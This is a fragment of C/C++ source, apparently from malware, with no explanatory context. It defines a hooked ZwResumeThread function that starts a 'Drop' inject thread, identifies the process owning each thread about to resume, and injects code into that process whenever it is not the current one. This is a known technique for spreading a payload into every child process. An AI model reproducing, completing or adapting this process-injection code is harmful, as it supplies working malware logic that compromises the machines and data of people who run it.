NTSTATUS NewZwResumeThread(HANDLE ThreadHandle, PULONG PreviousSuspendCount)
{
	Drop::CreateInjectStartThread();

	NTSTATUS St;
	THREAD_BASIC_INFORMATION ThreadBasicInfo;
	DWORD_PTR ReturnLength;

	St = NtQueryInformationThread(ThreadHandle, ThreadBasicInformation, (PVOID)&ThreadBasicInfo, sizeof(ThreadBasicInfo), &ReturnLength);
	if (NT_SUCCESS(St) && (DWORD)ThreadBasicInfo.ClientId.UniqueProcess != GetCurrentProcessId())
	{
		if (Inject::InjectProcess((DWORD)ThreadBasicInfo.ClientId.UniqueProcess, ThreadHandle))
		{
			DbgMsg(__FUNCTION__"(): InjectProcess started ok\r\n");
		}
	}
	return ZwResumeThread(ThreadHandle, PreviousSuspendCount);
}